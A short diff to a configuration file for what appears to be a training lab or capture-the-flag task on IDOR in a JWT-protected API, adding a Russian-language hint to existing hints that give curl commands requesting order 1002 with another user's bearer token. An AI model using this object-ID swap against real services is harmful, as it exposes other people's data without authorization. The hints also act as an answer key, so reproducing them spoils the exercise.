@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-auth-jwt-idor`): сначала baseline свой объект `.../orders/1001`, потом тот же токен на чужой 1002."
     - Свой заказ: `curl -s 'http://api.example/v1/orders/1001' -H 'Authorization: Bearer userA-token'`.
     - Твой заказ — 1001. А что если запросить 1002 с тем же токеном?
     - `curl -s 'http://api.example/v1/orders/1002' -H 'Authorization: Bearer userA-token'`.
